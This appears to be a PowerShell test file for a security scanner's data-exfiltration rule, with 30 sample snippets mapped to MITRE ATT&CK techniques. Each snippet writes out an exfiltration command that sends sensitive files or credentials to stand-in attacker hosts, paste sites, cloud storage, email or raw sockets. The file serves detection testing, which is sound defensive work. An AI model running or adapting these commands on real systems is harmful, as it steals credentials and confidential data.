# PowerShield Test Script: Data Exfiltration Detection
# This script contains intentional data exfiltration patterns for testing Rule 52
# MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol), T1041 (Exfiltration Over C2 Channel), T1567 (Exfiltration Over Web Service)

# Test 1: DNS tunneling with loop (Critical)
foreach ($chunk in $dataChunks) {
    Resolve-DnsName "$chunk.evil.example.com"
}

# Test 2: DNS query in ForEach (Critical)
1..100 | ForEach-Object {
    nslookup "data-$_.attacker.com"
}

# Test 3: HTTP POST with data (High)
$data = Get-Content "C:\Sensitive\passwords.txt"
Invoke-WebRequest -Uri "http://exfil.example.com/upload" -Method POST -Body $data

# Test 4: Invoke-RestMethod POST (High)
$secrets = @{username="admin"; password="secret123"}
Invoke-RestMethod -Uri "http://attacker.com/collect" -Method Post -Body ($secrets | ConvertTo-Json)

# Test 5: PUT method with file (High)
Invoke-WebRequest -Uri "http://evil.com/data" -Method Put -InFile "C:\Data\confidential.xlsx"

# Test 6: Pastebin upload (Critical)
$content = Get-Content "C:\Secrets\data.txt" -Raw
Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{api_paste_code=$content}

# Test 7: GitHub Gist upload (High)
$gistData = @{
    description = "data"
    public = $false
    files = @{
        "data.txt" = @{content = $sensitiveData}
    }
}
Invoke-RestMethod -Uri "https://api.github.com/gists" -Method POST -Body ($gistData | ConvertTo-Json)

# Test 8: hastebin upload (High)
Invoke-WebRequest -Uri "https://hastebin.com/documents" -Method POST -Body $data

# Test 9: paste.ee reference (High)
$url = "https://paste.ee/api"
Invoke-RestMethod -Uri $url -Method POST -Body $content

# Test 10: raw.githubusercontent.com access (High)
$uploadUrl = "https://raw.githubusercontent.com/attacker/repo/main/exfil.txt"
Invoke-WebRequest -Uri $uploadUrl -Method POST -Body $data

# Test 11: Dropbox upload (Critical)
$dropboxUrl = "https://content.dropboxapi.com/2/files/upload"
Invoke-RestMethod -Uri $dropboxUrl -Method POST -Body $fileBytes -Headers @{Authorization="Bearer token"}

# Test 12: Google Drive upload (Critical)
$driveUrl = "https://www.googleapis.com/upload/drive/v3/files"
Invoke-WebRequest -Uri $driveUrl -Method POST -InFile "C:\Data\sensitive.docx"

# Test 13: OneDrive upload (Critical)
$oneDriveUrl = "https://graph.microsoft.com/v1.0/me/drive/root:/file.txt:/content"
Invoke-RestMethod -Uri $oneDriveUrl -Method Put -Body $content

# Test 14: AWS S3 upload (Critical)
$s3Url = "https://mybucket.s3.amazonaws.com/exfil.zip"
Invoke-WebRequest -Uri $s3Url -Method PUT -InFile "C:\Temp\data.zip"

# Test 15: Azure Blob Storage (Critical)
$blobUrl = "https://myaccount.blob.core.windows.net/container/data.txt"
Invoke-RestMethod -Uri $blobUrl -Method PUT -Body $data

# Test 16: transfer.sh upload (Critical)
Invoke-WebRequest -Uri "https://transfer.sh/file.zip" -Method PUT -InFile "C:\Data\archive.zip"

# Test 17: mega.nz reference (High)
$megaUrl = "https://mega.nz/upload"
Invoke-WebRequest -Uri $megaUrl -Method POST -Body $content

# Test 18: Email with attachment (High)
Send-MailMessage -To "attacker@evil.com" -From "victim@company.com" -Subject "Data" -Attachments "C:\Sensitive\passwords.xlsx" -SmtpServer smtp.company.com

# Test 19: Email with body data (High)
$body = Get-Content "C:\Data\customer_list.txt" -Raw
Send-MailMessage -To "exfil@attacker.com" -Body $body -Subject "Export" -SmtpServer smtp.company.com

# Test 20: FTP upload (High)
$ftpUrl = "ftp://attacker.com/upload/data.txt"
$webclient = New-Object System.Net.WebClient
$webclient.UploadFile($ftpUrl, "C:\Sensitive\data.txt")

# Test 21: SFTP connection (High)
$sftpUrl = "sftp://exfil.example.com/incoming/"

# Test 22: Data compression before upload (Critical)
Compress-Archive -Path "C:\Sensitive\*" -DestinationPath "C:\Temp\exfil.zip"
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Temp\exfil.zip"

# Test 23: 7zip before web request (Critical)
7z a -tzip C:\Temp\data.zip C:\Sensitive\*
Invoke-RestMethod -Uri "http://exfil.com/collect" -Method POST -InFile "C:\Temp\data.zip"

# Test 24: Raw TCP socket (High)
$client = New-Object System.Net.Sockets.TcpClient("attacker.com", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine($sensitiveData)

# Test 25: UDP socket (High)
$udpClient = New-Object System.Net.Sockets.UdpClient
$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse("10.0.0.1"), 53)

# Test 26: Box.com upload (High)
$boxUrl = "https://upload.box.com/api/2.0/files/content"
Invoke-WebRequest -Uri $boxUrl -Method POST -Body $data

# Test 27: mediafire upload (High)
$mediafireUrl = "https://www.mediafire.com/api/1.5/upload/simple.php"
Invoke-RestMethod -Uri $mediafireUrl -Method POST -InFile "C:\Data\file.zip"

# Test 28: DNS over HTTPS for tunneling (High)
while ($dataRemaining) {
    Resolve-DnsName "encoded-data-$chunk.attacker.com" -DnsOnly
}

# Test 29: Google Cloud Storage (Critical)
$gcsUrl = "https://storage.googleapis.com/mybucket/sensitive.txt"
Invoke-WebRequest -Uri $gcsUrl -Method PUT -Body $content

# Test 30: privatebin upload (High)
$privatebinUrl = "https://privatebin.net"
Invoke-RestMethod -Uri $privatebinUrl -Method POST -Body @{paste=$data}

Write-Host "Data exfiltration detection test complete"
